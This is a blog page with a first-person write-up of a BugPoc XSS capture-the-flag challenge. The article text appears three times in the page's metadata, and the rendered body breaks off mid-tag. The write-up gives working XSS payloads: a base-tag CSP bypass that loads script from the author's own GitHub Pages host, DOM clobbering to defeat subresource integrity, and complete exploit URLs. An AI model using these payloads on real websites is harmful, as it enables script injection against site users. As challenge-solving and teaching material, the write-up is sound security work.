<!DOCTYPE html>
<html lang="en"><head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
<title>Solving BugPoc XSS challenge | Your awesome title</title>
<meta name="generator" content="Jekyll v4.3.4" />
<meta property="og:title" content="Solving BugPoc XSS challenge" />
<meta name="author" content="GitHub User" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="Heyy Everyoneee, I hope everyone one of you is doing good, recently @bugpoc shared a xss challenge , I was getting bored so I thought to give it a try .This writeup is going to be a walkthrough of how I approached the challenge, although I wasn’t able to solve the challenge completely but I want to share my experience by writing a blog anyway. Check out our XSS CTF! Skip an Amazon Interview + $2k in prizes!Submit solutions to before 11/09 10PM EDT.Rules: Must alert(origin), must bypass CSP, must work in Chrome, must provide a BugPoC demoGood luck!https://t.co/aC97HcnibP#bugbountytips As you can see the rules for this challenge in the embed tweet , we have to pop an alert(document.domain) and we need to bypass the CSP also. I started by visiting the website. So there was an input box where whatever input we provided is displayed back to us in wacky way after clicking on the button which says “Make Whacky!”. We have an input field, let’s try putting a xss payload and see what happens.I tried with basic xss payload “&gt;&lt;img src=x onerror=alert()&gt; And you can see the result: characters like &gt;&lt; are stripped from our input. Looking at the source code there was a js file: https://wacky.buggywebsite.com/script.js This piece of code was responsible for stripping of &gt;&lt;, the onkeyup event is fired when the user releases a key. Looking at the next piece code,our input was stored in a variable name val and then it was passed as a parameter value. Let’s go more deep to find out what was happening with our input after this. From the home page source we can see a iframe tag. The full url in the src attribute of the iframe tag is: Upon opening this url in a new tab we could see a completely different page than before, I expected it to be as same as we can see in the homepage with the wacky text but it wasn’t: https://wacky.buggywebsite.com/frame.html?param=Shirley So we now have found the piece of code (from this frame.html page)which was responsible for converting our text into whacky text. One more thing which was interesting here was that, we can supply any value to the param parameter and it will reflected as such (&lt;&gt; will not get stripped now) as the responsible code for replacing these characters isn’t available on this frame.html page. We just needed to close the title tag first , so we changed our input to: No popup yet this ain’t so easy, we forgot about the CSP we have to bypass it also. Bypassing the CSP: By going to this website https://csp-evaluator.withgoogle.com/ we can check if a Content Security Policy (CSP) serves as a strong mitigation against cross-site scripting attacks or not. Looking at the results: We can use base tags to bypass the CSP. Some information about the base tag you can find here: : The Document Base URL element - HTML: HyperText Markup Language | MDN By using a payload like: shirley&lt;/title&gt;&lt;base href=//shirley.xyz&gt;, our base url is used in this relative url. &lt;source src=”movie.mp4&quot; type=”video/mp4&quot;&gt; Now, we needed to know why was the frame.html page was showing different content when we opened it in a new tab. It was due to this piece code: If window.name is not equal to “iframe”, then the else part of code gets executed which is what we saw earlier. Let’s move on to do something the base tag. In this line of code you can see relative url is used: script.setAttribute(‘src’, ‘files/analytics/js/frame-analytics.js’); But we have to bypass the first condition if (window.name == ‘iframe’), which verifies if we are in an iframe or not, inorder to execute that line of code (script.setAttribute). I remember watching @liveoverflow video about a xss challenge from Google CTF, where he mentioned that window.name value remains same across different websites in the same tab/window. “window.name is special ” watch this video for more information: https://medium.com/media/275b375c9703de9a94bda1a1b6d4c153/href Now it’s fetching the frame-analytics.js file from our controlled website. Let’s create the particular js file on our server: our-server.com/files/analytics/js/frame-analytics.js I setup the js file on Github Pages. As I created the file “files/analytics/js/frame-analytics.js” under “/new” directory, my payload will changed to &lt;base href=//sudistar.github.io/new/&gt; Still this wasn’t working because of the integrity check: To find out what’s happening ,focus on this piece of code, along with src attribute one more attribute is set on the script tag which is integrity Subresource Integrity - Security on the web | MDN “It ensures that the files on your website fetches (from a CDN or anywhere) have been delivered without a third-party having injected any additional content into those files — and without any other changes of any kind at all having been made to those files”. Check out the above link to find out more about the integrity attribute. You can see what the actual contents of the js file was https://wacky.buggywebsite.com/files/analytics/js/frame-analytics.js, the hash unzMI6SuiNZmTzoOnV4Y9yqAjtSOgiIgyrKvumYRI6E= is for this js file. As we have added the base tag with href attribute value to our own server, this js file is being fetched from our server now and the content of our js file is alert(1); The hash for the js file which is on our server is: vyWxnR5/SfkpBXTjK7tyUvoeEZCT+fK2ayxsse+sBvs= which is not equal to the hash set in the integrity attribute by the wacky.buggywebsite.com host, because of this the browser blocks the execution of our script. This is the part of the challenge where I didn’t knew what to do next, I just needed to find a way to control the fileIntegrity.value so that I can set the appropriate hash so the browser can execute my script. Bypassing th Integrity Check: The answer to this solution was DOM clobbering, I didn’t knew anything about it. This idea hit me after watching @liveoverflow video again as the window.fileIntegrity part of the code looked very similar to @liveoverflow video. So I checked Portswigger Academy, some medium blogs to understand what actually Dom Clobbering is. Clobbering the clobbered — Advanced DOM Clobbering https://medium.com/media/32cc358152f0c741022ad18d9e724061/href DOM clobbering | Web Security Academy I used a similar payload to this: &lt;output id=fileIntegrity&gt;Hey Shirley&lt;/output&gt; and let’s have a look what’s inside fileIntegrity.value now Focus on the console, we have now control over the fileIntegrity.value. https://wacky.buggywebsite.com/frame.html?param=Hello,%20World!%3C/title%3E%3Coutput%20id=fileIntegrity%3EvyWxnR5%2FSfkpBXTjK7tyUvoeEZCT%2BfK2ayxsse%2BsBvs=%3C/output%3E%3Cbase%20href=%27//sudistark.github.io/new/%27%3E But again this didn’t work we have to overcome one more protection in place to pop an alert. (Others like confirm,prompt were also showing same error).I even tried with window.alert() but same error. Ignored call to ‘alert()’. The document is sandboxed, and the ‘allow-modals’ keyword is not set. This is the point where I had to give up. Upon loading the url in firefox this warning was shown in the console, “An iframe which has both allow-scripts and allow-same-origin for its sandbox attribute can remove its sandboxing.” This error in firefox and the ‘allow-modals’ error which we get in chrome were mentioning the word sandbox so I knew the last part would be related to something like bypassing the iframe sandbox and then we might be able to execute our js without any error. After the challenge was over, I checked the writeups by other people and found that as the iframe sandox attribute is set to allow-scripts and allow-same-origin which makes the sandbox useless. These are taken from other people writeups. The difference between window.top and window.parent can be found here: https://stackoverflow.com/questions/3473946/what-is-the-difference-between-window-window-top-and-window-parent Here are some of the blogs which I read: BugPoc XSS ctf challenge write-upBugPoc XSS Challenge - WriteupBugPoc XSS ctf challenge write-up Changed my payload according to what was mentioned in these blogs: https://wacky.buggywebsite.com/frame.html?param=Hello,%20World!%3C/title%3E%3Coutput%20id=fileIntegrity%3EkrmRFEi7jlxl25eA5ubo1m4MFKpavCfmWGD9uAXqgAE=%3C/output%3E%3Cbase%20href=%27//sudistark.github.io/new/%27%3E And the happiness comes after seeing this: Thankyou!! Sya Everyonee!" />
<meta property="og:description" content="Heyy Everyoneee, I hope everyone one of you is doing good, recently @bugpoc shared a xss challenge , I was getting bored so I thought to give it a try .This writeup is going to be a walkthrough of how I approached the challenge, although I wasn’t able to solve the challenge completely but I want to share my experience by writing a blog anyway. Check out our XSS CTF! Skip an Amazon Interview + $2k in prizes!Submit solutions to before 11/09 10PM EDT.Rules: Must alert(origin), must bypass CSP, must work in Chrome, must provide a BugPoC demoGood luck!https://t.co/aC97HcnibP#bugbountytips As you can see the rules for this challenge in the embed tweet , we have to pop an alert(document.domain) and we need to bypass the CSP also. I started by visiting the website. So there was an input box where whatever input we provided is displayed back to us in wacky way after clicking on the button which says “Make Whacky!”. We have an input field, let’s try putting a xss payload and see what happens.I tried with basic xss payload “&gt;&lt;img src=x onerror=alert()&gt; And you can see the result: characters like &gt;&lt; are stripped from our input. Looking at the source code there was a js file: https://wacky.buggywebsite.com/script.js This piece of code was responsible for stripping of &gt;&lt;, the onkeyup event is fired when the user releases a key. Looking at the next piece code,our input was stored in a variable name val and then it was passed as a parameter value. Let’s go more deep to find out what was happening with our input after this. From the home page source we can see a iframe tag. The full url in the src attribute of the iframe tag is: Upon opening this url in a new tab we could see a completely different page than before, I expected it to be as same as we can see in the homepage with the wacky text but it wasn’t: https://wacky.buggywebsite.com/frame.html?param=Shirley So we now have found the piece of code (from this frame.html page)which was responsible for converting our text into whacky text. One more thing which was interesting here was that, we can supply any value to the param parameter and it will reflected as such (&lt;&gt; will not get stripped now) as the responsible code for replacing these characters isn’t available on this frame.html page. We just needed to close the title tag first , so we changed our input to: No popup yet this ain’t so easy, we forgot about the CSP we have to bypass it also. Bypassing the CSP: By going to this website https://csp-evaluator.withgoogle.com/ we can check if a Content Security Policy (CSP) serves as a strong mitigation against cross-site scripting attacks or not. Looking at the results: We can use base tags to bypass the CSP. Some information about the base tag you can find here: : The Document Base URL element - HTML: HyperText Markup Language | MDN By using a payload like: shirley&lt;/title&gt;&lt;base href=//shirley.xyz&gt;, our base url is used in this relative url. &lt;source src=”movie.mp4&quot; type=”video/mp4&quot;&gt; Now, we needed to know why was the frame.html page was showing different content when we opened it in a new tab. It was due to this piece code: If window.name is not equal to “iframe”, then the else part of code gets executed which is what we saw earlier. Let’s move on to do something the base tag. In this line of code you can see relative url is used: script.setAttribute(‘src’, ‘files/analytics/js/frame-analytics.js’); But we have to bypass the first condition if (window.name == ‘iframe’), which verifies if we are in an iframe or not, inorder to execute that line of code (script.setAttribute). I remember watching @liveoverflow video about a xss challenge from Google CTF, where he mentioned that window.name value remains same across different websites in the same tab/window. “window.name is special ” watch this video for more information: https://medium.com/media/275b375c9703de9a94bda1a1b6d4c153/href Now it’s fetching the frame-analytics.js file from our controlled website. Let’s create the particular js file on our server: our-server.com/files/analytics/js/frame-analytics.js I setup the js file on Github Pages. As I created the file “files/analytics/js/frame-analytics.js” under “/new” directory, my payload will changed to &lt;base href=//sudistar.github.io/new/&gt; Still this wasn’t working because of the integrity check: To find out what’s happening ,focus on this piece of code, along with src attribute one more attribute is set on the script tag which is integrity Subresource Integrity - Security on the web | MDN “It ensures that the files on your website fetches (from a CDN or anywhere) have been delivered without a third-party having injected any additional content into those files — and without any other changes of any kind at all having been made to those files”. Check out the above link to find out more about the integrity attribute. You can see what the actual contents of the js file was https://wacky.buggywebsite.com/files/analytics/js/frame-analytics.js, the hash unzMI6SuiNZmTzoOnV4Y9yqAjtSOgiIgyrKvumYRI6E= is for this js file. As we have added the base tag with href attribute value to our own server, this js file is being fetched from our server now and the content of our js file is alert(1); The hash for the js file which is on our server is: vyWxnR5/SfkpBXTjK7tyUvoeEZCT+fK2ayxsse+sBvs= which is not equal to the hash set in the integrity attribute by the wacky.buggywebsite.com host, because of this the browser blocks the execution of our script. This is the part of the challenge where I didn’t knew what to do next, I just needed to find a way to control the fileIntegrity.value so that I can set the appropriate hash so the browser can execute my script. Bypassing th Integrity Check: The answer to this solution was DOM clobbering, I didn’t knew anything about it. This idea hit me after watching @liveoverflow video again as the window.fileIntegrity part of the code looked very similar to @liveoverflow video. So I checked Portswigger Academy, some medium blogs to understand what actually Dom Clobbering is. Clobbering the clobbered — Advanced DOM Clobbering https://medium.com/media/32cc358152f0c741022ad18d9e724061/href DOM clobbering | Web Security Academy I used a similar payload to this: &lt;output id=fileIntegrity&gt;Hey Shirley&lt;/output&gt; and let’s have a look what’s inside fileIntegrity.value now Focus on the console, we have now control over the fileIntegrity.value. https://wacky.buggywebsite.com/frame.html?param=Hello,%20World!%3C/title%3E%3Coutput%20id=fileIntegrity%3EvyWxnR5%2FSfkpBXTjK7tyUvoeEZCT%2BfK2ayxsse%2BsBvs=%3C/output%3E%3Cbase%20href=%27//sudistark.github.io/new/%27%3E But again this didn’t work we have to overcome one more protection in place to pop an alert. (Others like confirm,prompt were also showing same error).I even tried with window.alert() but same error. Ignored call to ‘alert()’. The document is sandboxed, and the ‘allow-modals’ keyword is not set. This is the point where I had to give up. Upon loading the url in firefox this warning was shown in the console, “An iframe which has both allow-scripts and allow-same-origin for its sandbox attribute can remove its sandboxing.” This error in firefox and the ‘allow-modals’ error which we get in chrome were mentioning the word sandbox so I knew the last part would be related to something like bypassing the iframe sandbox and then we might be able to execute our js without any error. After the challenge was over, I checked the writeups by other people and found that as the iframe sandox attribute is set to allow-scripts and allow-same-origin which makes the sandbox useless. These are taken from other people writeups. The difference between window.top and window.parent can be found here: https://stackoverflow.com/questions/3473946/what-is-the-difference-between-window-window-top-and-window-parent Here are some of the blogs which I read: BugPoc XSS ctf challenge write-upBugPoc XSS Challenge - WriteupBugPoc XSS ctf challenge write-up Changed my payload according to what was mentioned in these blogs: https://wacky.buggywebsite.com/frame.html?param=Hello,%20World!%3C/title%3E%3Coutput%20id=fileIntegrity%3EkrmRFEi7jlxl25eA5ubo1m4MFKpavCfmWGD9uAXqgAE=%3C/output%3E%3Cbase%20href=%27//sudistark.github.io/new/%27%3E And the happiness comes after seeing this: Thankyou!! Sya Everyonee!" />
<link rel="canonical" href="http://localhost:4000/2020/11/10/solving-bugpoc-xss-challenge.html" />
<meta property="og:url" content="http://localhost:4000/2020/11/10/solving-bugpoc-xss-challenge.html" />
<meta property="og:site_name" content="Your awesome title" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2020-11-10T00:00:00+05:30" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="Solving BugPoc XSS challenge" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"GitHub User"},"dateModified":"2020-11-10T00:00:00+05:30","datePublished":"2020-11-10T00:00:00+05:30","description":"Heyy Everyoneee, I hope everyone one of you is doing good, recently @bugpoc shared a xss challenge , I was getting bored so I thought to give it a try .This writeup is going to be a walkthrough of how I approached the challenge, although I wasn’t able to solve the challenge completely but I want to share my experience by writing a blog anyway. Check out our XSS CTF! Skip an Amazon Interview + $2k in prizes!Submit solutions to before 11/09 10PM EDT.Rules: Must alert(origin), must bypass CSP, must work in Chrome, must provide a BugPoC demoGood luck!https://t.co/aC97HcnibP#bugbountytips As you can see the rules for this challenge in the embed tweet , we have to pop an alert(document.domain) and we need to bypass the CSP also. I started by visiting the website. So there was an input box where whatever input we provided is displayed back to us in wacky way after clicking on the button which says “Make Whacky!”. We have an input field, let’s try putting a xss payload and see what happens.I tried with basic xss payload “&gt;&lt;img src=x onerror=alert()&gt; And you can see the result: characters like &gt;&lt; are stripped from our input. Looking at the source code there was a js file: https://wacky.buggywebsite.com/script.js This piece of code was responsible for stripping of &gt;&lt;, the onkeyup event is fired when the user releases a key. Looking at the next piece code,our input was stored in a variable name val and then it was passed as a parameter value. Let’s go more deep to find out what was happening with our input after this. From the home page source we can see a iframe tag. The full url in the src attribute of the iframe tag is: Upon opening this url in a new tab we could see a completely different page than before, I expected it to be as same as we can see in the homepage with the wacky text but it wasn’t: https://wacky.buggywebsite.com/frame.html?param=Shirley So we now have found the piece of code (from this frame.html page)which was responsible for converting our text into whacky text. One more thing which was interesting here was that, we can supply any value to the param parameter and it will reflected as such (&lt;&gt; will not get stripped now) as the responsible code for replacing these characters isn’t available on this frame.html page. We just needed to close the title tag first , so we changed our input to: No popup yet this ain’t so easy, we forgot about the CSP we have to bypass it also. Bypassing the CSP: By going to this website https://csp-evaluator.withgoogle.com/ we can check if a Content Security Policy (CSP) serves as a strong mitigation against cross-site scripting attacks or not. Looking at the results: We can use base tags to bypass the CSP. Some information about the base tag you can find here: : The Document Base URL element - HTML: HyperText Markup Language | MDN By using a payload like: shirley&lt;/title&gt;&lt;base href=//shirley.xyz&gt;, our base url is used in this relative url. &lt;source src=”movie.mp4&quot; type=”video/mp4&quot;&gt; Now, we needed to know why was the frame.html page was showing different content when we opened it in a new tab. It was due to this piece code: If window.name is not equal to “iframe”, then the else part of code gets executed which is what we saw earlier. Let’s move on to do something the base tag. In this line of code you can see relative url is used: script.setAttribute(‘src’, ‘files/analytics/js/frame-analytics.js’); But we have to bypass the first condition if (window.name == ‘iframe’), which verifies if we are in an iframe or not, inorder to execute that line of code (script.setAttribute). I remember watching @liveoverflow video about a xss challenge from Google CTF, where he mentioned that window.name value remains same across different websites in the same tab/window. “window.name is special ” watch this video for more information: https://medium.com/media/275b375c9703de9a94bda1a1b6d4c153/href Now it’s fetching the frame-analytics.js file from our controlled website. Let’s create the particular js file on our server: our-server.com/files/analytics/js/frame-analytics.js I setup the js file on Github Pages. As I created the file “files/analytics/js/frame-analytics.js” under “/new” directory, my payload will changed to &lt;base href=//sudistar.github.io/new/&gt; Still this wasn’t working because of the integrity check: To find out what’s happening ,focus on this piece of code, along with src attribute one more attribute is set on the script tag which is integrity Subresource Integrity - Security on the web | MDN “It ensures that the files on your website fetches (from a CDN or anywhere) have been delivered without a third-party having injected any additional content into those files — and without any other changes of any kind at all having been made to those files”. Check out the above link to find out more about the integrity attribute. You can see what the actual contents of the js file was https://wacky.buggywebsite.com/files/analytics/js/frame-analytics.js, the hash unzMI6SuiNZmTzoOnV4Y9yqAjtSOgiIgyrKvumYRI6E= is for this js file. As we have added the base tag with href attribute value to our own server, this js file is being fetched from our server now and the content of our js file is alert(1); The hash for the js file which is on our server is: vyWxnR5/SfkpBXTjK7tyUvoeEZCT+fK2ayxsse+sBvs= which is not equal to the hash set in the integrity attribute by the wacky.buggywebsite.com host, because of this the browser blocks the execution of our script. This is the part of the challenge where I didn’t knew what to do next, I just needed to find a way to control the fileIntegrity.value so that I can set the appropriate hash so the browser can execute my script. Bypassing th Integrity Check: The answer to this solution was DOM clobbering, I didn’t knew anything about it. This idea hit me after watching @liveoverflow video again as the window.fileIntegrity part of the code looked very similar to @liveoverflow video. So I checked Portswigger Academy, some medium blogs to understand what actually Dom Clobbering is. Clobbering the clobbered — Advanced DOM Clobbering https://medium.com/media/32cc358152f0c741022ad18d9e724061/href DOM clobbering | Web Security Academy I used a similar payload to this: &lt;output id=fileIntegrity&gt;Hey Shirley&lt;/output&gt; and let’s have a look what’s inside fileIntegrity.value now Focus on the console, we have now control over the fileIntegrity.value. https://wacky.buggywebsite.com/frame.html?param=Hello,%20World!%3C/title%3E%3Coutput%20id=fileIntegrity%3EvyWxnR5%2FSfkpBXTjK7tyUvoeEZCT%2BfK2ayxsse%2BsBvs=%3C/output%3E%3Cbase%20href=%27//sudistark.github.io/new/%27%3E But again this didn’t work we have to overcome one more protection in place to pop an alert. (Others like confirm,prompt were also showing same error).I even tried with window.alert() but same error. Ignored call to ‘alert()’. The document is sandboxed, and the ‘allow-modals’ keyword is not set. This is the point where I had to give up. Upon loading the url in firefox this warning was shown in the console, “An iframe which has both allow-scripts and allow-same-origin for its sandbox attribute can remove its sandboxing.” This error in firefox and the ‘allow-modals’ error which we get in chrome were mentioning the word sandbox so I knew the last part would be related to something like bypassing the iframe sandbox and then we might be able to execute our js without any error. After the challenge was over, I checked the writeups by other people and found that as the iframe sandox attribute is set to allow-scripts and allow-same-origin which makes the sandbox useless. These are taken from other people writeups. The difference between window.top and window.parent can be found here: https://stackoverflow.com/questions/3473946/what-is-the-difference-between-window-window-top-and-window-parent Here are some of the blogs which I read: BugPoc XSS ctf challenge write-upBugPoc XSS Challenge - WriteupBugPoc XSS ctf challenge write-up Changed my payload according to what was mentioned in these blogs: https://wacky.buggywebsite.com/frame.html?param=Hello,%20World!%3C/title%3E%3Coutput%20id=fileIntegrity%3EkrmRFEi7jlxl25eA5ubo1m4MFKpavCfmWGD9uAXqgAE=%3C/output%3E%3Cbase%20href=%27//sudistark.github.io/new/%27%3E And the happiness comes after seeing this: Thankyou!! Sya Everyonee!","headline":"Solving BugPoc XSS challenge","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/2020/11/10/solving-bugpoc-xss-challenge.html"},"url":"http://localhost:4000/2020/11/10/solving-bugpoc-xss-challenge.html"}</script>
<!-- End Jekyll SEO tag -->
<link rel="stylesheet" href="/assets/css/style.css"><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="Your awesome title" />
<script src="//cdn.jsdelivr.net/npm/@microlink/vanilla@latest/umd/microlink.min.js"></script>

<script>
  document.addEventListener('DOMContentLoaded', function (event) {
    microlink('.card-preview')
  })
</script>
  
</head>
<body><header class="site-header">

  <div class="wrapper"><a class="site-title" rel="author" href="/">Your awesome title</a><nav class="site-nav">
        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
        <label for="nav-trigger">
          <span class="menu-icon">
            <svg viewBox="0 0 18 15" width="18px" height="15px">
              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
            </svg>
          </span>
        </label>

        <div class="trigger"><a class="page-link" href="/about/">About</a></div>
      </nav></div>
</header>
<main class="page-content" aria-label="Content">
      <div class="wrapper">
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">

  <header class="post-header">
    <h1 class="post-title p-name" itemprop="name headline">Solving BugPoc XSS challenge</h1>
    <p class="post-meta"><time class="dt-published" datetime="2020-11-10T00:00:00+05:30" itemprop="datePublished">
        Nov 10, 2020
      </time></p>
  </header>

  <div class="post-content e-content" itemprop="articleBody">
    <p>Heyy Everyoneee,</p><p>I hope everyone one of you is doing good, recently @bugpoc shared a xss challenge , I was getting bored so I thought to give it a try .This writeup is going to be a walkthrough of how I approached the challenge, although I wasn’t able to solve the challenge completely but I want to share my experience by writing a blog anyway.</p><h3></h3><p>Check out our XSS CTF! Skip an Amazon Interview + $2k in prizes!Submit solutions to before 11/09 10PM EDT.Rules: Must alert(origin), must bypass CSP, must work in Chrome, must provide a BugPoC demoGood luck!https://t.co/aC97HcnibP#bugbountytips</p><p>As you can see the <em>rules </em>for this challenge in the embed tweet , we have to pop an alert(document.domain) and we need to bypass the CSP also.</p><p>I started by visiting the website.</p><figure><img alt="" src="https://cdn-images-1.medium.com/max/1024/1*hLr6D9Vl6jYeiIDS04DvVA.png" /></figure><p>So there was an input box where whatever input we provided is displayed back to us in wacky way after clicking on the button which says “Make Whacky!”.</p><p>We have an input field, let’s try putting a xss payload and see what happens.I tried with basic xss payload “&gt;&lt;img src=x onerror=alert()&gt;</p><p>And you can see the result: characters like &gt;&lt; are stripped from our input.</p><figure><img alt="" src="https://cdn-images-1.medium.com/max/1024/1*ci3fc8SiRYnAdDhjGaMfLw.png" /></figure><p>Looking at the source code there was a js file: <a href="https://wacky.buggywebsite.com/script.js">https://wacky.buggywebsite.com/script.js</a></p><figure><img alt="" src="https://cdn-images-1.medium.com/max/616/1*dK8O2z4wZ7L6HVXiQu-thQ.png" /></figure><p>This piece of code was responsible for stripping of &gt;&lt;, the onkeyup event is fired when the user releases a key. Looking at the next piece code,our input was stored in a variable name val and then it was passed as a parameter value.</p><figure><img alt="" src="https://cdn-images-1.medium.com/max/800/1*2B8Q8rEo2L3-jjK-NbHG5w.png" /></figure><p>Let’s go more deep to find out what was happening with our input after this. From the home page source we can see a iframe tag.</p><figure><img alt="" src="https://cdn-images-1.medium.com/max/1024/1*e7d80CbXPzn8h1w7JkJSyQ.png" /></figure><p>The full url in the src attribute of the iframe tag is:</p><figure><img alt="" src="https://cdn-images-1.medium.com/max/902/1*51jDd2fKO9kOzHwwI6Iy7Q.png" /></figure><p>Upon opening this url in a new tab we could see a completely different page than before, I expected it to be as same as we can see in the homepage with the wacky text but it wasn’t:</p><figure><img alt="" src="https://cdn-images-1.medium.com/max/1024/1*4AWJ3iJxWbZ_oJhey1F2tg.png" /><figcaption><a href="https://wacky.buggywebsite.com/frame.html?param=Shirley">https://wacky.buggywebsite.com/frame.html?param=Shirley</a></figcaption></figure><p>So we now have found the piece of code (from this frame.html page)which was responsible for converting our text into whacky text.</p><figure><img alt="" src="https://cdn-images-1.medium.com/max/949/1*qm5wq__Xlc2-5bm-aaeLkQ.png" /></figure><p>One more thing which was interesting here was that, we can supply any value to the param parameter and it will reflected as such (&lt;&gt; will not get stripped now) as the responsible code for replacing these characters isn’t available on this frame.html page.</p><figure><img alt="" src="https://cdn-images-1.medium.com/max/883/1*fb_jtelDM4zlot3b4xFpmw.png" /></figure><p>We just needed to close the title tag first , so we changed our input to:</p><figure><img alt="" src="https://cdn-images-1.medium.com/max/481/1*9MlhnikdyQoN02ctiybzJw.png" /></figure><p>No popup yet this ain’t so easy, we forgot about the CSP we have to bypass it also.</p><figure><img alt="" src="https://cdn-images-1.medium.com/max/1024/1*lvO3inX8YZkq2r26nzJE9w.png" /></figure><h4>Bypassing the CSP:</h4><p>By going to this website <a href="https://csp-evaluator.withgoogle.com/">https://csp-evaluator.withgoogle.com/</a> we can check if a Content Security Policy (CSP) serves as a strong mitigation against <a href="https://www.google.com/about/appsecurity/learning/xss/">cross-site scripting attacks</a> or not.</p><p>Looking at the results:</p><figure><img alt="" src="https://cdn-images-1.medium.com/max/856/1*dr4qfMTEtG04EEKt0kVNlg.png" /></figure><p>We can use base tags to bypass the CSP. Some information about the base tag you can find here:</p><p><a href="https://developer.mozilla.org/en-US/docs/Web/HTML/Element/base">: The Document Base URL element - HTML: HyperText Markup Language | MDN</a></p><figure><img alt="" src="https://cdn-images-1.medium.com/max/659/1*k18qLAW92UTRoy7Mc2ceIA.png" /></figure><p>By using a payload like: <strong>shirley&lt;/title&gt;&lt;base href=//shirley.xyz&gt;</strong>, our base url is used in this relative url.</p><p><strong>&lt;source src=”movie.mp4&quot; type=”video/mp4&quot;&gt;</strong></p><figure><img alt="" src="https://cdn-images-1.medium.com/max/964/1*50gOLS5oMMNokE713V3x_A.png" /></figure><p>Now, we needed to know why was the frame.html page was showing different content when we opened it in a new tab.</p><p>It was due to this piece code:</p><figure><img alt="" src="https://cdn-images-1.medium.com/max/757/1*W0bJNM6tNCo-pBXZcwfWcw.png" /></figure><p>If window.name is not equal to “iframe”, then the else part of code gets executed which is what we saw earlier.</p><p>Let’s move on to do something the base tag. In this line of code you can see relative url is used:</p><p>script.setAttribute(‘src’, ‘files/analytics/js/frame-analytics.js’);</p><p>But we have to bypass the first condition <strong>if (window.name == ‘iframe’),</strong></p><p>which verifies if we are in an iframe or not, inorder to execute that line of code (script.setAttribute).</p><p>I remember watching @liveoverflow video about a xss challenge from Google CTF, where he mentioned that window.name value remains same across different websites in the same tab/window.</p><p>“window.name is special ” watch this video for more information:</p><iframe src="https://cdn.embedly.com/widgets/media.html?src=https%3A%2F%2Fwww.youtube.com%2Fembed%2FdZXaQKEE3A8%3Ffeature%3Doembed&amp;display_name=YouTube&amp;url=https%3A%2F%2Fwww.youtube.com%2Fwatch%3Fv%3DdZXaQKEE3A8&amp;image=https%3A%2F%2Fi.ytimg.com%2Fvi%2FdZXaQKEE3A8%2Fhqdefault.jpg&amp;key=a19fcc184b9711e1b4764040d3dc5c07&amp;type=text%2Fhtml&amp;schema=youtube" width="854" height="480" frameborder="0" scrolling="no"><a href="https://medium.com/media/275b375c9703de9a94bda1a1b6d4c153/href">https://medium.com/media/275b375c9703de9a94bda1a1b6d4c153/href</a></iframe><p>Now it’s fetching the frame-analytics.js file from our controlled website.</p><figure><img alt="" src="https://cdn-images-1.medium.com/max/1024/1*P9PH4XeGw_iM1voOs55mKA.png" /></figure><p>Let’s create the particular js file on our server: our-server.com/files/analytics/js/frame-analytics.js</p><p>I setup the js file on Github Pages.</p><figure><img alt="" src="https://cdn-images-1.medium.com/max/1024/1*Gk3Y8Sqn0UqoHbnGaKENdg.png" /></figure><p>As I created the file “files/analytics/js/frame-analytics.js” under “/new” directory, my payload will changed to &lt;base href=//sudistar.github.io/new/&gt;</p><p>Still this wasn’t working because of the integrity check:</p><figure><img alt="" src="https://cdn-images-1.medium.com/max/1024/1*5Nfv2tG_1h3nBsYdmX4brA.png" /></figure><p>To find out what’s happening ,focus on this piece of code, along with src attribute one more attribute is set on the script tag which is integrity</p><figure><img alt="" src="https://cdn-images-1.medium.com/max/826/1*2X_K4_skpZHfbZX8y8C9ZA.png" /></figure><p><a href="https://developer.mozilla.org/en-US/docs/Web/Security/Subresource_Integrity">Subresource Integrity - Security on the web | MDN</a></p><p>“It ensures that the files on your website fetches (from a CDN or anywhere) have been delivered without a third-party having injected any additional content into those files — and without any other changes of any kind at all having been made to those files”. Check out the above link to find out more about the integrity attribute.</p><p>You can see what the actual contents of the js file was <a href="https://wacky.buggywebsite.com/files/analytics/js/frame-analytics.js">https://wacky.buggywebsite.com/files/analytics/js/frame-analytics.js</a>, the hash unzMI6SuiNZmTzoOnV4Y9yqAjtSOgiIgyrKvumYRI6E= is for this js file.</p><p>As we have added the base tag with href attribute value to our own server, this js file is being fetched from our server now and the content of our js file is <strong>alert(1);</strong></p><p>The hash for the js file which is on our server is: <strong>vyWxnR5/SfkpBXTjK7tyUvoeEZCT+fK2ayxsse+sBvs=</strong> which is not equal to the hash set in the integrity attribute by the wacky.buggywebsite.com host, because of this the browser blocks the execution of our script.</p><p>This is the part of the challenge where I didn’t knew what to do next, I just needed to find a way to control the fileIntegrity.value so that I can set the appropriate hash so the browser can execute my script.</p><h4><strong>Bypassing th Integrity Check:</strong></h4><p>The answer to this solution was DOM clobbering, I didn’t knew anything about it. This idea hit me after watching @liveoverflow video again as the window.fileIntegrity part of the code looked very similar to @liveoverflow video.</p><p>So I checked Portswigger Academy, some medium blogs to understand what actually Dom Clobbering is.</p><p><a href="https://medium.com/@terjanq/dom-clobbering-techniques-8443547ebe94">Clobbering the clobbered — Advanced DOM Clobbering</a></p><iframe 